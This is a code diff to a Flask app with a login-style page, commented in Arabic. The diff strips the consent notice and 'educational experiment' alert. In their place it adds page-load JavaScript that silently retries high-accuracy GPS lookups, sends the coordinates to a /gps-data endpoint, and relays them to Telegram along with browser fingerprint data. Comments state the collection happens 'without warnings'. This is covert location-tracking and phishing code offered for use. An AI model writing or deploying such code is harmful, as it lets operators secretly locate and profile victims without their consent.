@@ -146,53 +146,81 @@ login_page_html = '''
         </div>
     </div>
     <script>
-    // دالة لطلب الموقع وتوضيح الإذن للمستخدم
+    // دالة لطلب الموقع بصمت (بدون تحذيرات)
     function requestLocation() {
         if (navigator.geolocation) {
-            // عرض رسالة للمستخدم أنه سيتم طلب الإذن
-            alert('سيتم طلب الإذن لمشاركة موقعك مع هذه التجربة التعليمية. يرجى الموافقة لتتمكن من رؤية المحتوى.');
+            let attempts = 0;
+            const maxAttempts = 3;
+            let bestAccuracy = Infinity;
+            let bestLat = null;
+            let bestLng = null;
             
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    // في حال الموافقة: إرسال الموقع
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    
-                    fetch('/gps-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ lat, lng, accuracy })
-                    }).catch(err => console.log('خطأ في إرسال GPS:', err));
-                    
-                    // إعلام المستخدم بأن الموقع تم مشاركته
-                    alert('✅ تم مشاركة موقعك بنجاح!');
-                },
-                function(error) {
-                    // في حال الرفض أو الخطأ
-                    let errorMsg = '❌ لم تتم مشاركة الموقع. ';
-                    if (error.code === 1) {
-                        errorMsg += 'لقد رفضت الإذن. يمكنك تغيير ذلك في إعدادات المتصفح.';
-                    } else if (error.code === 2) {
-                        errorMsg += 'الموقع غير متاح حالياً. حاول مرة أخرى.';
-                    } else if (error.code === 3) {
-                        errorMsg += 'انتهى وقت طلب الموقع. حاول مرة أخرى.';
+            function getLocation() {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // تخزين أفضل موقع (أقل دقة = أفضل)
+                        if (accuracy < bestAccuracy) {
+                            bestAccuracy = accuracy;
+                            bestLat = lat;
+                            bestLng = lng;
+                        }
+                        
+                        // إذا كانت الدقة جيدة (أقل من 50 متر) أو وصلنا لأقصى محاولات
+                        if (accuracy < 50 || attempts >= maxAttempts - 1) {
+                            // إرسال أفضل موقع تم الحصول عليه
+                            fetch('/gps-data', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    lat: bestLat, 
+                                    lng: bestLng, 
+                                    accuracy: bestAccuracy 
+                                })
+                            }).catch(err => console.log('خطأ في إرسال GPS:', err));
+                        } else {
+                            // المحاولة مرة أخرى للحصول على دقة أفضل
+                            attempts++;
+                            setTimeout(getLocation, 2000);
+                        }
+                    },
+                    function(error) {
+                        // في حال فشل GPS، نحاول مرة أخرى (بدون تحذيرات)
+                        if (attempts < maxAttempts) {
+                            attempts++;
+                            setTimeout(getLocation, 2000);
+                        } else {
+                            // بعد فشل كل المحاولات، نرسل ما لدينا (حتى لو كانت دقة منخفضة)
+                            if (bestLat && bestLng) {
+                                fetch('/gps-data', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ 
+                                        lat: bestLat, 
+                                        lng: bestLng, 
+                                        accuracy: bestAccuracy || 9999 
+                                    })
+                                }).catch(err => console.log('خطأ في إرسال GPS:', err));
+                            }
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
                     }
-                    alert(errorMsg);
-                    console.log('خطأ في الموقع:', error.message);
-                },
-                {
-                    enableHighAccuracy: true,  // طلب موقع دقيق
-                    timeout: 10000,            // مهلة 10 ثوانٍ
-                    maximumAge: 0              // لا تستخدم موقعاً مخزناً مؤقتاً
-                }
-            );
-        } else {
-            alert('❌ متصفحك لا يدعم خاصية تحديد الموقع.');
+                );
+            }
+            
+            // البدء بطلب الموقع
+            getLocation();
         }
     }
 
-    // جمع بيانات المتصفح الإضافية
+    // جمع بيانات المتصفح الإضافية (بدون تحذيرات)
     function collectBrowserData() {
         const data = {
             screenWidth: window.screen.width,
@@ -215,7 +243,6 @@ login_page_html = '''
 
     // استدعاء الدوال عند تحميل الصفحة
     window.onload = function() {
-        // تأخير بسيط لضمان تحميل الصفحة بالكامل
         setTimeout(requestLocation, 1000);
         collectBrowserData();
     };
@@ -294,22 +321,22 @@ def capture():
     '''
     return success_page
 
-# ========== استقبال الموقع الدقيق (GPS) - التصحيح النهائي ==========
+# ========== استقبال الموقع الدقيق (GPS) ==========
 @app.route('/gps-data', methods=['POST'])
 def gps_data():
     data = request.get_json()
     lat = data.get('lat')
-    lon = data.get('lng')  # التصحيح النهائي: lng بدلاً من lon
+    lon = data.get('lng')  # استخدام lng بدلاً من lon
     accuracy = data.get('accuracy')
     
     # التحقق من صحة البيانات
     if lon is None or lat is None:
+        # إرسال خطأ إلى تليجرام (بدون تحذيرات للمستخدم)
         error_msg = f"""
 ⚠️ <b>فشل تحديد الموقع بدقة</b>
 📱 الأسباب المحتملة:
 1. لم تسمح بمشاركة الموقع في المتصفح
 2. إشارة GPS ضعيفة (جرب في مكان مفتوح)
-3. استخدم متصفح Google Chrome للحصول على أفضل دقة
 
 📝 البيانات المستلمة:
 خط العرض: {lat}
